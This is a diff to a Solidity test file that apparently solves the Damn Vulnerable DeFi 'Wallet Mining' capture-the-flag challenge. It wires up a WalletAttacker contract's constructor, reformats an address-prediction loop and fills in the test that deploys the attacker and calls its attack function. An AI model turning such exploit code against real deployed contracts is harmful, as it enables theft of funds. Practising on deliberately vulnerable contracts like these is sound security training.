@@ -45,12 +45,18 @@ contract WalletAttacker {
     address constant USER_DEPOSIT_ADDRESS =
         0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
 
-    constructor(AuthorizerUpgradeable _authorizer, DamnValuableToken _token,WalletDeployer _walletDeployer,
-     SafeProxyFactory _proxyFactory,Safe _singletonCopy
+    constructor(
+        AuthorizerUpgradeable _authorizer,
+        DamnValuableToken _token,
+        WalletDeployer _walletDeployer,
+        SafeProxyFactory _proxyFactory,
+        Safe _singletonCopy
     ) {
         authorizer = _authorizer;
         token = _token;
-        walletDeployer =_walletDeployer;
+        walletDeployer = _walletDeployer;
+        proxyFactory = _proxyFactory;
+        singletonCopy = _singletonCopy;
     }
 
     function attack() external {
@@ -91,7 +97,7 @@ contract WalletAttacker {
             );
 
             if (predicted == USER_DEPOSIT_ADDRESS) {
-              console.log(USER_DEPOSIT_ADDRESS);
+                console.log(USER_DEPOSIT_ADDRESS);
                 break;
             }
         }
@@ -260,7 +266,16 @@ contract WalletMiningChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_walletMining() public checkSolvedByPlayer {}
+    function test_walletMining() public checkSolvedByPlayer {
+        WalletAttacker attacker = new WalletAttacker(
+            AuthorizerUpgradeable(authorizer),
+            DamnValuableToken(token),
+            WalletDeployer(walletDeployer),
+            SafeProxyFactory(proxyFactory),
+            Safe(singleCopy)
+        );
+        attacker.attack();
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
